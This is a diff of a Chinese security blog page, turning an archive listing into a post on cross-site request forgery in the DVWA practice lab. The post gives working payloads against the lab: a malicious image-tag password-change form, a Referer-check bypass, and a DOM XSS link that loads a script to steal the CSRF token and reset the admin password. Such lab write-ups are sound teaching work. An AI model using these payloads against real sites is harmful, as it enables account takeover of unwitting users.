@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="dvwa," />
 
 
 
@@ -79,16 +79,25 @@
 
 
 
-<meta name="description" content="satomhxl@gmail.com">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xL&#39;s Blog">
-<meta property="og:url" content="http://satomhxl.github.io/archives/index.html">
+<meta name="description" content="csrf 全名 cross site request forgery(跨站请求伪造)。 该攻击的核心在于 “服务器信任用户的浏览器所发出的请求就是用户想要的请求”。利用的思想是 想办法取得服务器对该用户的信任(cookie,session等)，并让浏览器发送恶意请求(加载图片，js脚本等)。 许多网站对于用户的认证信息都保存在了浏览器中，比如我们访问许多网站经常都可以跳过输入账号密码的步骤。这使得">
+<meta name="keywords" content="dvwa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA(3)-CSRF">
+<meta property="og:url" content="http://satomhxl.github.io/2017/12/03/DVWA3-CSRF/index.html">
 <meta property="og:site_name" content="xL&#39;s Blog">
-<meta property="og:description" content="satomhxl@gmail.com">
+<meta property="og:description" content="csrf 全名 cross site request forgery(跨站请求伪造)。 该攻击的核心在于 “服务器信任用户的浏览器所发出的请求就是用户想要的请求”。利用的思想是 想办法取得服务器对该用户的信任(cookie,session等)，并让浏览器发送恶意请求(加载图片，js脚本等)。 许多网站对于用户的认证信息都保存在了浏览器中，比如我们访问许多网站经常都可以跳过输入账号密码的步骤。这使得">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_1.png">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_3.png">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_2.png">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_xss.png">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_xss2.png">
+<meta property="og:image" content="http://satomhxl.github.io/images/dvwa3_xss1.png">
+<meta property="og:updated_time" content="2017-12-03T07:55:13.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xL&#39;s Blog">
-<meta name="twitter:description" content="satomhxl@gmail.com">
+<meta name="twitter:title" content="DVWA(3)-CSRF">
+<meta name="twitter:description" content="csrf 全名 cross site request forgery(跨站请求伪造)。 该攻击的核心在于 “服务器信任用户的浏览器所发出的请求就是用户想要的请求”。利用的思想是 想办法取得服务器对该用户的信任(cookie,session等)，并让浏览器发送恶意请求(加载图片，js脚本等)。 许多网站对于用户的认证信息都保存在了浏览器中，比如我们访问许多网站经常都可以跳过输入账号密码的步骤。这使得">
+<meta name="twitter:image" content="http://satomhxl.github.io/images/dvwa3_1.png">
 
 
 
@@ -118,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://satomhxl.github.io/archives/"/>
+  <link rel="canonical" href="http://satomhxl.github.io/2017/12/03/DVWA3-CSRF/"/>
 
 
 
 
 
-  <title>归档 | xL's Blog</title>
+  <title>DVWA(3)-CSRF | xL's Blog</title>
   
 
 
@@ -143,7 +152,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -261,407 +270,192 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://satomhxl.github.io/2017/12/03/DVWA3-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xL">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xL's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">DVWA(3)-CSRF</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-03T15:46:20+08:00">
+                2017-12-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 10 篇日志。 继续努力。
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2017">2017</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/12/03/DVWA3-CSRF/" itemprop="url">
-              
-                <span itemprop="name">DVWA(3)-CSRF</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-12-03T15:46:20+08:00"
-              content="2017-12-03" >
-          12-03
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+        </div>
+      </header>
+    
 
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/22/DVWA2-Exec/" itemprop="url">
-              
-                <span itemprop="name">DVWA(2)-command injection</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-22T20:46:49+08:00"
-              content="2017-11-22" >
-          11-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/18/DVWA1-BruteForce/" itemprop="url">
-              
-                <span itemprop="name">DVWA(1)-Brute Force</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-18T18:01:27+08:00"
-              content="2017-11-18" >
-          11-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <p>csrf 全名 cross site request forgery(跨站请求伪造)。</p>
+<p>该攻击的核心在于 “服务器信任用户的浏览器所发出的请求就是用户想要的请求”。利用的思想是 想办法取得服务器对该用户的信任(cookie,session等)，并让浏览器发送恶意请求(加载图片，js脚本等)。</p>
+<p>许多网站对于用户的认证信息都保存在了浏览器中，比如我们访问许多网站经常都可以跳过输入账号密码的步骤。这使得服务器端对于敏感操作如果不加有效的用户认证的话，容易遭受 csrf 攻击。</p>
+<a id="more"></a>
+<h2 id="low-security"><a href="#low-security" class="headerlink" title="low-security"></a>low-security</h2><p>low-level下没有任何防护措施。</p>
+<p>一个重置密码的界面。<br><img src="/images/dvwa3_1.png" alt=""></p>
+<p>用burp suite 抓包取得表单参数。<br><img src="/images/dvwa3_3.png" alt=""></p>
+<p>构造恶意表单<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://localhost/DVWA/vulnerabilities/csrf/?password_new=haha&amp;password_conf=haha&amp;Change=Change"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>无论 DVWA 页面是否开启，或者浏览器是否已经关闭过，只要浏览器端对应的cookie存在，那么访问了此恶意页面，通过<code>&lt;img&gt;</code>标签的加载发送恶意请求，攻击就可以实现。</p>
+<h2 id="medium-security"><a href="#medium-security" class="headerlink" title="medium-security"></a>medium-security</h2><p>medium-level 中加入了对 Referer 字段的检查。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ])</span><br></pre></td></tr></table></figure>
+<p>判断 运行服务器的主机名 是否包含在 HTTP 头的 Referer 字段中。</p>
+<ul>
+<li>stripos() 返回 参数2 在 参数1 中第一次出现的位置。是 strpos() 不区分大小写的版本。</li>
+<li>$_SERVER[] 超全局变量，由服务器创建，保存服务器的一些信息。 <code>SERVER_NAME</code>返回运行脚本的服务器主机名</li>
+</ul>
+<p>当请求表单的 Referer 不符合时，将报错:<br><img src="/images/dvwa3_2.png" alt=""></p>
+<p>Http 头中的 Referer 字段用来标明请求来源于哪个地址。也就是你是从哪里发起请求的。<br>在安全应用中，可以检查 Referer 字段 与 访问的地址 是否处于同一域名下，来简单地判断用户的操作是否正常。</p>
+<p>从前面的截图可以中看到 referer。 其值为 <code>http://172.16.65.130/DVWA/vulnerabilities/csrf/</code></p>
+<p>PHP 官方文档对<code>$_SERVER[&#39;SRVER_NAME&#39;]</code>作了注释：</p>
+<blockquote>
+<p>在 Apache 2 里，必须设置 <a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">UseCanonicalName = On</a> 和 ServerName。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值</p>
+</blockquote>
+<p>以下是 Wikipedia 中对于用检查 Referer 方式防御 CSRF 的评论：</p>
+<blockquote>
+<p>这种办法简单易行，但因其完全依赖浏览器发送正确的Referer字段,并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
+</blockquote>
+<p>可以看出，这种方式并不安全。</p>
+<ul>
+<li>用Burp Suite 可以直接修改 Referer 字段。</li>
+<li>服务器的地址为 <code>http://172.16.65.130//DVWA/vulnerabilities/csrf/</code><br>，那么将恶意表单的文件名改为 172.16.65.130.html，就可以成功绕过检查。</li>
+</ul>
+<h2 id="high-level"><a href="#high-level" class="headerlink" title="high-level"></a>high-level</h2><p>在 high-level 中，用到了如今防御 csrf 常用的方法：csrf token</p>
+<p>那么我们是否能在自己的恶意页面中运行js脚本取得目标页面的token呢？<br>答案是不行。现在的浏览器普遍对<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="external">跨域请求资源</a>有访问控制。对于需要验证的资源，跨域请求会被拒绝。</p>
+<p>这里我们结合 xss 漏洞来利用。DVWA的xss项目共有 DOM，reflect,store 3种。这里用 DOM来演示。<br>xss的相关细节还是放到xss篇再来讲吧。<br>(Google浏览器中有 xss auditor，会自动将输入的所有疑似 js 代码屏蔽，因此这里使用 Firefox)</p>
+<p><img src="/images/dvwa3_xss.png" alt="xss-DOM"></p>
+<p>这里用<code>?default#&lt;script&gt;alert(&quot;haha&quot;)&lt;/script&gt;</code>可以成功运行js代码。<br><img src="/images/dvwa3_xss2.png" alt="xss_dom2"></p>
+<p>当我们成功注入js文件<code>test.js</code>到目标站点时，可以用以下url来实现攻击<code>http://172.16.65.134/DVWA/vulnerabilities/xss_d/?default=English#&lt;script src=&quot;http://172.16.65.134/test.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>test.js脚本内容<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://172.16.65.134/DVWA/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">var</span> pass = <span class="string">'admin'</span>;</span><br><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> hacked = <span class="literal">false</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> new_url = <span class="string">'http://172.16.65.134/DVWA/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new='</span>+pass+<span class="string">'&amp;password_conf='</span>+pass+<span class="string">'&amp;Change=Change'</span></span><br><span class="line">        <span class="keyword">if</span>(!hacked)&#123;</span><br><span class="line">            alert(<span class="string">'Got token:'</span> + match[<span class="number">1</span>]);</span><br><span class="line">            hacked = <span class="literal">true</span>;</span><br><span class="line">            xmlhttp.open(<span class="string">"GET"</span>, new_url, <span class="literal">false</span> );</span><br><span class="line">            xmlhttp.send();  </span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>, theUrl );</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/dvwa3_xss1.png" alt="xss_DOM1"></p>
+<p>弹出消息，说明攻击成功，此时admin的password已经改为了<code>admin</code></p>
+<p>总结起来，首先需要注入恶意脚本到目标站点，然后令用户的浏览器访问以上链接，来通过xss漏洞执行脚本实现csrf攻击。<br>其实这算是xss攻击了，csrf更像是攻击成功之后的利用。</p>
+<h2 id="impossible-level"><a href="#impossible-level" class="headerlink" title="impossible-level"></a>impossible-level</h2><p>此level下，修改密码需要输入当前的密码。</p>
+<p>虽然在现实应用中一般不会有这样的设定，但是基本思想就是 对于敏感操作，需要多重的验证，来充分说明当前的动作确实是用户想要进行的，而不是被恶意诱导后在不知情的情况下秘密进行。</p>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>UseCanonicalName<br>一般服务端会根据用户提供的URL以及端口来提供响应的页面。那么诸如主机名 <code>$_SERVER[&#39;SERVER_NAME&#39;]</code>(php) 就会由客户端提供。<br>但是对于一些不会跳转到别的主机的页面来说，它的 <code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 只有一个，根本不需要用户来提供，那么就可以设置 UseCanonicalName=On 配合 ServerName=‘…’ ，使得 <code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 的值直接由服务器端来提供。</p>
+<p>新发布的 OWASP2017 中删去了 CSRF，原因是只有不到5%的应用程序中能发现 CSRF，且只在8%左右的应用程序中发现未验证的重定向和转发。</p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/18/dvwa登陆机制与cookie-session/" itemprop="url">
-              
-                <span itemprop="name">dvwa登陆机制与cookie,session</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-18T17:59:29+08:00"
-              content="2017-11-18" >
-          11-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/06/md4-collision/" itemprop="url">
-              
-                <span itemprop="name">MD4 Collisions</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-06T18:42:55+08:00"
-              content="2017-11-06" >
-          11-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/10/22/Cryptopal-set1/" itemprop="url">
-              
-                <span itemprop="name">Cryptopal-set1</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-10-22T22:46:10+08:00"
-              content="2017-10-22" >
-          10-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/10/18/Vim-base/" itemprop="url">
-              
-                <span itemprop="name">Vim-base</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-10-18T16:15:26+08:00"
-              content="2017-10-18" >
-          10-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/29/sqlmap之POST表单注入/" itemprop="url">
-              
-                <span itemprop="name">sqlmap之POST表单注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-29T23:53:07+08:00"
-              content="2017-09-29" >
-          09-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/21/gdb/" itemprop="url">
-              
-                <span itemprop="name">gdb_base</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-21T11:06:16+08:00"
-              content="2017-09-21" >
-          09-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/08/21/PE/" itemprop="url">
-              
-                <span itemprop="name">PE</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-21T20:30:46+08:00"
-              content="2017-08-21" >
-          08-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dvwa/" rel="tag"># dvwa</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/22/DVWA2-Exec/" rel="next" title="DVWA(2)-command injection">
+                <i class="fa fa-chevron-left"></i> DVWA(2)-command injection
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -669,6 +463,8 @@
 
 
           
+  
+
 
         </div>
         
@@ -689,8 +485,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -743,6 +548,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-security"><span class="nav-number">1.</span> <span class="nav-text">low-security</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-security"><span class="nav-number">2.</span> <span class="nav-text">medium-security</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high-level"><span class="nav-number">3.</span> <span class="nav-text">high-level</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impossible-level"><span class="nav-number">4.</span> <span class="nav-text">impossible-level</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录"><span class="nav-number">5.</span> <span class="nav-text">附录</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -862,6 +683,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
 
   
 
@@ -1229,26 +1054,6 @@
   
 
   
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
 
 
